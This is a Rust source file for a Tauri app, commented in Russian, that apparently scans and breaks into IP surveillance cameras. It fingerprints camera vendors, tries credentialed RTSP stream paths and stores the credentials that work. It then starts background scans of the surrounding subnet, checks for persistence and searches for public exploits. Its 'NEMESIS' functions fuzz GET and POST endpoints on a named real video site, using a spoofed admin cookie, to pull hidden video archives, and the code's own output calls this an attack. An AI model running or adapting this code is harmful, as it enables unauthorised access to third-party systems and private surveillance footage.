use std::process::Command;
use std::time::Duration;
use tauri::command;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

/// Ультимативный Сканер: Анализ проприетарных портов + RTSP Fingerprinting
async fn fingerprint_vendor_deep(ip: &str) -> &'static str {
    let timeout = std::time::Duration::from_millis(800);

    // 🕵️‍♂️ УРОВЕНЬ 1: Сканирование проприетарных портов (Самый точный метод)
    // Асинхронно стучимся в служебные порты, которые камеры не могут скрыть
    let check_port = |port: u16| async move {
        tokio::time::timeout(timeout, tokio::net::TcpStream::connect((ip, port)))
            .await
            .is_ok()
    };

    // Запускаем проверки параллельно (0 задержек)
    let (is_hik_port, is_xm_port) = tokio::join!(
        check_port(8000),  // Служебный SDK порт Hikvision
        check_port(34567)  // Служебный NETIP порт XMeye / Tantos
    );

    if is_xm_port {
        return "xmeye";
    }
    if is_hik_port {
        return "hikvision";
    }

    // 🕵️‍♂️ УРОВЕНЬ 2: Классический RTSP OPTIONS (Если порты проброшены криво)
    if let Ok(Ok(mut stream)) =
        tokio::time::timeout(timeout, tokio::net::TcpStream::connect((ip, 554))).await
    {
        // OPTIONS безопаснее, чем DESCRIBE, он реже вызывает 400 Bad Request
        let req = format!(
            "OPTIONS rtsp://{}:554/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: Hyperion/5.0\r\n\r\n",
            ip
        );
        if stream.write_all(req.as_bytes()).await.is_ok() {
            let mut buf = [0; 1024];
            if let Ok(Ok(n)) = tokio::time::timeout(timeout, stream.read(&mut buf)).await {
                let response = String::from_utf8_lossy(&buf[..n]).to_lowercase();

                if response.contains("app-webs")
                    || response.contains("hikvision")
                    || response.contains("ds-")
                {
                    return "hikvision";
                }
                if response.contains("uc-httpd")
                    || response.contains("xiongmai")
                    || response.contains("realm=\"login to")
                    || response.contains("realm=\"ipc")
                {
                    return "xmeye";
                }
            }
        }
    }

    "unknown"
}

/// Мгновенная проверка существования пути через сырой RTSP-запрос (занимает ~50мс)
async fn fast_rtsp_check(host: &str, full_url: &str) -> bool {
    let addr = format!("{}:554", host);

    // Пытаемся быстро подключиться
    if let Ok(Ok(mut stream)) =
        tokio::time::timeout(Duration::from_millis(800), TcpStream::connect(&addr)).await
    {
        // Формируем стандартный RTSP запрос
        let request = format!("OPTIONS {} RTSP/1.0\r\nCSeq: 1\r\n\r\n", full_url);

        if stream.write_all(request.as_bytes()).await.is_ok() {
            let mut buf = [0; 512];
            // Ждем ответа
            if let Ok(Ok(n)) =
                tokio::time::timeout(Duration::from_millis(800), stream.read(&mut buf)).await
            {
                let response = String::from_utf8_lossy(&buf[..n]);

                // Если камера вернула 404, пути точно нет.
                // Если 200 OK или 401 Unauthorized - путь существует.
                if !response.contains("404 Not Found") && response.contains("RTSP/1.0") {
                    return true;
                }
            }
        }
    }
    false
}

fn build_path_candidates(vendor: &str, host: &str, login: &str, pass: &str) -> Vec<String> {
    let mut urls = Vec::new();

    match vendor {
        "hikvision" => {
            urls.push(format!(
                "rtsp://{}:{}@{}:554/Streaming/Channels/102",
                login, pass, host
            ));
            urls.push(format!(
                "rtsp://{}:{}@{}:554/Streaming/Channels/101",
                login, pass, host
            ));
        }
        "xmeye" => {
            urls.push(format!(
                "rtsp://{}:{}@{}:554/cam/realmonitor?channel=1&subtype=1",
                login, pass, host
            ));
            urls.push(format!(
                "rtsp://{}:{}@{}:554/ch1/sub/av_stream",
                login, pass, host
            ));
            urls.push(format!(
                "rtsp://{}:{}@{}:554/live/ch01_1",
                login, pass, host
            ));
        }
        _ => {
            urls.push(format!(
                "rtsp://{}:{}@{}:554/Streaming/Channels/102",
                login, pass, host
            ));
            urls.push(format!(
                "rtsp://{}:{}@{}:554/cam/realmonitor?channel=1&subtype=1",
                login, pass, host
            ));
            urls.push(format!(
                "rtsp://{}:{}@{}:554/ch1/sub/av_stream",
                login, pass, host
            ));
            urls.push(format!(
                "rtsp://{}:{}@{}:554/Streaming/Channels/101",
                login, pass, host
            ));
        }
    }

    urls
}

async fn fast_rtsp_probe(rtsp_host: &str, url: &str, ffmpeg: &str) -> bool {
    if !fast_rtsp_check(rtsp_host, url).await {
        println!("[SPIDER] ⚡ Быстрый сброс несуществующего пути: {}", url);
        return false;
    }

    println!(
        "[SPIDER] 🎯 Путь существует, запускаем глубокую FFmpeg проверку: {}",
        url
    );

    std::process::Command::new(ffmpeg)
        .args(crate::ffmpeg::FfmpegProfiles::probe(url))
        .status()
        .is_ok_and(|status| status.success())
}

fn schedule_ptes_audit(audit_ip: String, audit_vendor: String) {
    tokio::spawn(async move {
        tokio::time::sleep(std::time::Duration::from_secs(10)).await;

        println!(
            "\n[PTES] 🕵️‍♂️ Видеопоток стабилен. Начинаем глубокий фоновый аудит для {}...",
            audit_ip
        );

        let _ = tokio::join!(
            async {
                if let Ok(report) =
                    crate::session_checker::check_session_security(audit_ip.clone()).await
                {
                    println!("{}", report);
                }
            },
            async {
                if let Ok(report) = crate::api_fuzzer::run_api_fuzzer(audit_ip.clone()).await {
                    println!("{}", report);
                }
            },
            async {
                if let Ok(report) = crate::vuln_scanner::verify_vulnerabilities(
                    audit_ip.clone(),
                    audit_vendor.clone(),
                )
                .await
                {
                    println!("{}", report);
                }
            },
            async {
                if let Ok(report) =
                    crate::persistence_checker::assess_persistence_risk(audit_ip.clone()).await
                {
                    println!("{}", report);
                }
            },
            async {
                if let Ok(report) = crate::subnet_scanner::scan_neighborhood(audit_ip.clone()).await
                {
                    println!("{}", report);
                }
            },
            async {
                if let Ok(report) =
                    crate::exploit_searcher::search_public_exploits(audit_vendor.clone()).await
                {
                    println!("{}", report);
                }
            }
        );

        println!("[PTES] 🏁 Фоновый аудит для {} завершен.\n", audit_ip);
    });
}

fn persist_knowledge(
    km: &crate::knowledge::KnowledgeManager,
    host: &str,
    vendor: &str,
    url: &str,
    login: &str,
    pass: &str,
) {
    km.save_success(host, vendor, url, login, pass);
}

/// Перебор (фаззинг) RTSP путей для поиска рабочего видеопотока
#[command]
pub async fn probe_rtsp_path(host: String, login: String, pass: String) -> Result<String, String> {
    let rtsp_host = crate::normalize_host_for_scan(&host);

    let km = crate::knowledge::KnowledgeManager::new();
    let history = km.load_all();
    let ffmpeg = crate::get_ffmpeg_path();

    // 🧠 ЭТАП 0: Проверка памяти (Feedback Learning)
    if let Some(exp) = history.get(&rtsp_host) {
        println!(
            "[KNOWLEDGE] Найдена запись для {}. Проверяем сохраненный путь...",
            rtsp_host
        );
        let s = std::process::Command::new(&ffmpeg)
            .args(crate::ffmpeg::FfmpegProfiles::probe(&exp.successful_path))
            .status();
        if let Ok(status) = s {
            if status.success() {
                println!(
                    "[KNOWLEDGE] Сохраненный путь актуален: {}",
                    exp.successful_path
                );
                schedule_ptes_audit(rtsp_host.clone(), exp.vendor.clone());
                return Ok(exp.successful_path.clone());
            }
        }
        println!("[KNOWLEDGE] Сохраненный путь устарел. Начинаем глубокую разведку.");
    }

    // 🕵️‍♂️ ЭТАП 1: TCP/RTSP Fingerprinting (Твой текущий код разведки)
    let vendor = fingerprint_vendor_deep(&rtsp_host).await;

    println!(
        "[SPIDER] Умная Разведка IP {}: Вендор = {}",
        rtsp_host, vendor
    );

    // 🎯 ЭТАП 2: Снайперский словарь (Ищем ЛЕГКИЕ Sub-Streams)
    let urls = build_path_candidates(vendor, &rtsp_host, &login, &pass);

    // 🚀 ЭТАП 3: Проверка путей
    for url in urls {
        if fast_rtsp_probe(&rtsp_host, &url, &ffmpeg).await {
            println!("[SPIDER] Успешный перехват потока: {}", url);
            persist_knowledge(&km, &rtsp_host, vendor, &url, &login, &pass);
            schedule_ptes_audit(rtsp_host.clone(), vendor.to_string());
            return Ok(url);
        }
    }

    let fallback_url = format!(
        "rtsp://{}:{}@{}:554/Streaming/Channels/101",
        login, pass, rtsp_host
    );
    persist_knowledge(&km, &rtsp_host, vendor, &fallback_url, &login, &pass);
    schedule_ptes_audit(rtsp_host.clone(), vendor.to_string());

    Ok(fallback_url)
}

/// Фаззинг GET-параметров для поиска скрытых архивов (NEMESIS)
#[command]
pub async fn nemesis_fuzz_archive_endpoint(
    admin_hash: String,
    target_ftp_path: String,
) -> Result<Vec<String>, String> {
    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let mut successful_hits = Vec::new();
    let endpoints = vec![
        "rtsp2mjpeg.php",
        "ajax.php",
        "test.php",
        "check.php",
        "get.php",
        "video.php",
        "archive.php",
        "stream.php",
        "api.php",
    ];
    let param_names = vec![
        "file",
        "path",
        "src",
        "video",
        "archive_path",
        "url",
        "id",
        "name",
        "target",
    ];

    for endpoint in endpoints {
        for param in &param_names {
            let url = format!(
                "https://videodvor.by/stream/{}?{}={}&get=1",
                endpoint, param, target_ftp_path
            );
            if let Ok(resp) = client
                .get(&url)
                .header("Cookie", format!("login=mvd; admin={}", admin_hash))
                .send()
                .await
            {
                let status = resp.status();
                let len = resp.content_length().unwrap_or(0);
                let ctype = resp
                    .headers()
                    .get("content-type")
                    .and_then(|v| v.to_str().ok())
                    .unwrap_or("");

                if status.is_success()
                    && (ctype.contains("video") || ctype.contains("octet-stream") || len > 500_000)
                {
                    successful_hits.push(format!("🎯 УСПЕХ (ВИДЕО): {}", url));
                } else if status.is_success() && len > 0 {
                    let body = resp.text().await.unwrap_or_default();
                    if body.contains(".mkv") && !body.contains("<!DOCTYPE html>") {
                        successful_hits.push(format!("💡 НАЙДЕН РЫЧАГ (ССЫЛКА): {}", url));
                    }
                }
            }
        }
    }
    if successful_hits.is_empty() {
        Ok(vec![
            "GET-сканирование завершено. Прямых точек входа не найдено.".to_string(),
        ])
    } else {
        Ok(successful_hits)
    }
}

/// Фаззинг POST-эндпоинтов
#[command]
pub async fn nemesis_fuzz_post_endpoints(
    admin_hash: String,
    target_ftp_path: String,
) -> Result<Vec<String>, String> {
    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36")
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let mut successful_hits = Vec::new();
    let endpoints = vec![
        "ajax.php",
        "check.php",
        "get.php",
        "rtsp2mjpeg.php",
        "api.php",
        "video.php",
    ];
    let param_names = vec!["path", "file", "url", "target", "src"];
    let actions = vec!["download", "get_video", "fetch", "load", "archive"];

    for endpoint in endpoints {
        for param in &param_names {
            for action in &actions {
                let url = format!("https://videodvor.by/stream/{}", endpoint);
                let payload = [
                    (param.to_string(), target_ftp_path.clone()),
                    ("action".to_string(), action.to_string()),
                ];

                if let Ok(resp) = client
                    .post(&url)
                    .header("Cookie", format!("login=mvd; admin={}", admin_hash))
                    .header("X-Requested-With", "XMLHttpRequest")
                    .form(&payload)
                    .send()
                    .await
                {
                    let status = resp.status();
                    let len = resp.content_length().unwrap_or(0);
                    let ctype = resp
                        .headers()
                        .get("content-type")
                        .and_then(|v| v.to_str().ok())
                        .unwrap_or("");

                    if status.is_success() && (ctype.contains("video") || len > 500_000) {
                        successful_hits.push(format!(
                            "🎯 POST-УСПЕХ (ВИДЕО) в {} [{}={}&action={}]",
                            url, param, target_ftp_path, action
                        ));
                    } else if status.is_success() && len > 0 {
                        let body = resp.text().await.unwrap_or_default();
                        if body.contains(".mkv") && !body.contains("<!DOCTYPE html>") {
                            successful_hits.push(format!(
                                "💡 POST-РЫЧАГ (ССЫЛКА) в {}: {}",
                                url,
                                &body.chars().take(150).collect::<String>()
                            ));
                        }
                    }
                }
            }
        }
    }
    if successful_hits.is_empty() {
        Ok(vec!["POST-атака завершена. Пусто.".to_string()])
    } else {
        Ok(successful_hits)
    }
}
